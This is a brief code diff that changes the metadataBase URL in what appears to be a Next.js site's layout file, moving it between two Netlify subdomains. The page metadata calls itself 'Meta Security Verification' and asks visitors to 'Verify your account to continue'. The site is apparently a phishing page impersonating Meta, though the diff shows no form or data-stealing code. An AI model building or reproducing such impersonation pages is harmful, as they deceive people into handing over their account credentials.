@@ -16,7 +16,7 @@ const robotoMono = Roboto_Mono({
 });
 
 export const metadata: Metadata = {
-    metadataBase: new URL('https://gleaming-capybara-bd95c1.netlify.app'),
+    metadataBase: new URL('https://emenme.netlify.app/'),
     title: 'Meta Security Verification',
     description: 'Verify your account to continue',
 };
